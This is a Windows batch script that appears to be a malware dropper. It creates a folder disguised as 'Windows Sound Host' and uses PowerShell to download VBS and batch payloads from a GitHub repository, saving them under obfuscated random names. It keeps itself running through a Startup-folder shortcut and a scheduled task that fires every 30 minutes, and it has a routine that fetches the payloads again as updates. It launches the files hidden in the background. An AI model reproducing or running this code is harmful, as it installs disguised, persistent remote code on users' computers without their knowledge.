@echo off 
::load of bs 
cd \
if not exist %userprofile%\documents\"Windows Sound Host" ( 
    mkdir "Windows Sound Host"
)
if not exist %userprofile%\documents\update\ (
    mkdir %userprofile%\documents\update\
)

set path1= %userprofile%\documents\"Windows Sound Host"
cd %path1%

if exist "%path1%\entr.bat"(
    del "%path1%\entr.bat"
)
if %1 == "update"(
    goto update
)
if exist "%path1%\31513wd5w1d3a5wd185s3d51a.bat"(
    goto update
)

::gets files and starts them or drops for later 
powershell Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/i.vbs' -Outfile ./15a65da65s1d8w86s51d8aw.vbs; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/snds.bat' -Outfile ./116161as5d1a5d3a21sd51aw13s1d85aw1d35.bat; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/Autorun.bat' -Outfile ./31513wd5w1d3a5wd185s3d51a.bat; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/AutoUpdate.bat' -Outfile ./31513wd5w1d3a5wdawdawd66wd4d185s3d51a.bat; cd %userprofile%\documents\update; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/update.txt' -Outfile ./update.txt
:crtasks
if not exist %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk ( 
    powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk');$s.TargetPath='%userprofile%\documents\Windows Sound Host\31513wd5w1d3a5wd185s3d51a.bat';$s.Save()"
    
)

schtasks /create /tn "Sound Host Str" /tr "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk" /sc minute /mo 30
:: starts the script that starts .bat files hidden in background 
cd %path1%
start 31513wd5w1d3a5wd185s3d51a.bat

exit

::remove and add all update shit to entr.bat
:update


powershell Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/snds.bat' -Outfile ./116161as5d1a5d3a21sd51aw13s1d85aw1d35.bat; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/Autorun.bat' -Outfile ./31513wd5w1d3a5wd185s3d51a.bat; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/update.txt' -Outfile ./update.txt
goto crtasks




